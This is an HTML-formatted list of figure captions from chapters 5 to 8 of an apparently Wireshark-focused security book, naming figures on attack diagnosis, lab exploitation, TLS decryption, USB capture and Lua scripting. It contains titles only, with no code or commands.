style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Chapter 5: Diagnosing Attacks</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.1000pt;margin-right:145.3500pt;margin-left:53.0000pt;line-height:145%;" ><span><a href="#_bookmark373" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 5-1: Man-in-the-middle position</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark378" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 5-2: Ping and ARP transaction</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark382" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 5-3: W4SP Lab network</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.1000pt;margin-right:273.7500pt;margin-left:53.0000pt;line-height:145%;" ><span><a href="#_bookmark386" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 5-4: W4SP&#8217;s vic1</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark391" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 5-5: LOCALSIP</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.0500pt;margin-right:207.6000pt;margin-left:53.0000pt;line-height:145%;" ><span><a href="#_bookmark393" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 5-6: Exploit in progress</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark395" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 5-7: ARP packets fly</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.1000pt;margin-right:145.3500pt;margin-left:53.0000pt;line-height:145%;" ><span><a href="#_bookmark398" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 5-8: FTP credentials to attacker</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark401" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 5-9: Expert information</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.0500pt;margin-right:178.7000pt;margin-left:53.0000pt;line-height:145%;" ><span><a href="#_bookmark406" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 5-10: Noting your IP address</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark408" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 5-11: DHCP module options</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark411" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 5-12: DHCP running</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.1000pt;margin-right:221.2000pt;margin-left:53.0000pt;line-height:145%;" ><span><a href="#_bookmark413" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 5-13: DNS settings done</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark416" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 5-14: DNS queries</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark419" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 5-15: Quieter fake DNS</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark422" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 5-16: FTP capturing</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark433" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 5-17: Mirai password list</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark441" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 5-18: Pingbed</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section8" ><p class=MsoBodyText  style="margin-top:3.7500pt;margin-right:295.5500pt;margin-left:53.0000pt;line-height:145%;" ><span><a href="#_bookmark444" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 5-19: Gh0st</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark446" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 5-20: Xinmic</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.0500pt;margin-right:145.3500pt;margin-left:30.5000pt;text-indent:22.5000pt;line-height:145%;" ><span><a href="#_bookmark450" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 5-21: Malware analysis practice</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Chapter 6: Offensive Wireshark</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.1000pt;margin-right:207.6000pt;margin-left:53.0000pt;line-height:145%;" ><span><a href="#_bookmark461" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 6-1: W4SP Lab network</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark465" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 6-2: Nmap port scan</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.0500pt;margin-right:154.1000pt;margin-left:53.0000pt;line-height:145%;" ><span><a href="#_bookmark467" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 6-3: Nmap port scan in Wireshark</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark470" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 6-4: Open port in Wireshark</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark478" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 6-5: Metasploitable and its IP</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.1000pt;margin-right:129.8000pt;margin-left:53.0000pt;line-height:145%;" ><span><a href="#_bookmark481" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 6-6: Searching for the VSFTPD exploit</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark483" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 6-7: Exploit success but no shell</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark487" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 6-8: Exploit attempt in Wireshark</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark489" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 6-9: Exploit success with shell</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.1500pt;margin-right:114.0000pt;margin-left:53.0000pt;line-height:145%;" ><span><a href="#_bookmark492" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 6-10: Root shell command WHOAMI</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark494" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 6-11: Root in packet bytes</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.1000pt;margin-right:167.2500pt;margin-left:53.0000pt;line-height:145%;" ><span><a href="#_bookmark500" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 6-12: Metasploit RMI data</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark502" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 6-13: Metasploit HTTP JAR data</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark505" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 6-14: Metasploit hex dump</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark508" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 6-15: Unanswered SYNs</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.1500pt;margin-right:207.6000pt;margin-left:53.0000pt;line-height:145%;" ><span><a href="#_bookmark513" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 6-16: Filter for tcp/4444</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark518" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 6-17: Encrypted traffic</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark521" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 6-18: ELK</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.1000pt;margin-right:229.0000pt;margin-left:53.0000pt;line-height:145%;" ><span><a href="#_bookmark523" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 6-19: Time-field name</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark527" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 6-20: SSHdump install</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.0500pt;margin-right:52.5000pt;margin-left:30.5000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Chapter 7: Decrypting TLS, Capturing USB, Keyloggers, and Network Graphing</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section9" ><p class=MsoBodyText  style="margin-top:3.7500pt;margin-left:53.0000pt;" ><span><a href="#_bookmark537" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 7-1: Browsing to ftp1.labs</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;margin-right:101.7500pt;margin-left:53.0000pt;line-height:145%;" ><span><a href="#_bookmark540" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 7-2: Follow TCP stream on SSL/TLS</span></u><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);letter-spacing:-1.5000pt;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >&nbsp;</span></u><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >traffic</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark542" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 7-3: Wireshark SSL/TLS protocol options</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark545" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 7-4: Setting up SSL/TLS decryption</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark548" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >&nbsp;Figure 7-5: Decrypting TLS traffic in Wireshark</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark552" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 7-6: Adding</span></u><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);letter-spacing:-0.3000pt;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >&nbsp;</span></u><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >SSLKEYLOGFILE</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.1500pt;margin-right:178.7000pt;margin-left:53.0000pt;line-height:145%;" ><span><a href="#_bookmark555" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 7-7: Decrypted SSL/TLS data</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark559" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 7-8: USB device overview</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark562" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 7-9: usbmon interfaces</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.1500pt;margin-right:114.0000pt;margin-left:53.0000pt;line-height:145%;" ><span><a href="#_bookmark565" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 7-10: Connecting USB device to Kali VM</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark568" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 7-11: Wireshark usbmon error</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.0500pt;margin-right:178.7000pt;margin-left:53.0000pt;line-height:145%;" ><span><a href="#_bookmark570" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 7-12: Capturing on usbmon2</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark574" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 7-13: USBPcap device list</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  align=justify  style="margin-top:0.1000pt;margin-right:164.4000pt;margin-left:53.0000pt;text-align:justify;text-justify:inter-ideograph;line-height:145%;" ><span><a href="#_bookmark577" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 7-14: USBPcap running a</span></u><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);letter-spacing:-1.3000pt;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >&nbsp;</span></u><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >capture</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark579" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 7-15: Filtering USB traffic to host</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark582" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 7-16: HID key</span></u><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);letter-spacing:-0.3000pt;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >&nbsp;</span></u><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >codes</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.1000pt;margin-left:53.0000pt;" ><span><a href="#_bookmark586" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 7-17: TShark key sniffer</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;margin-right:114.0000pt;margin-left:30.5000pt;text-indent:22.5000pt;line-height:145%;" ><span><a href="#_bookmark595" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 7-18: TShark-generated network graph</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Chapter 8: Scripting with Lua</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.0500pt;margin-right:168.9000pt;margin-left:53.0000pt;line-height:145%;" ><span><a href="#_bookmark608" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 8-1: Lua Interactive</span></u><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);letter-spacing:-1.4000pt;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >&nbsp;</span></u><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Interpreter</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark619" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 8-2: Wireshark About page</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark625" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 8-3: Lua in Tools</span></u><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);letter-spacing:-0.4500pt;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >&nbsp;</span></u><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >menu</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.1500pt;margin-right:154.1000pt;margin-left:53.0000pt;line-height:145%;" ><span><a href="#_bookmark627" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 8-4: Lua Console in Wireshark</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark630" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 8-5: Wireshark Evaluate Lua</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark643" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 8-6: Wireshark without a</span></u><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);letter-spacing:-1.2000pt;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >&nbsp;</span></u><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >dissector</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark646" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 8-7: Our protocol</span></u><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);letter-spacing:-0.3500pt;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >&nbsp;</span></u><u><span 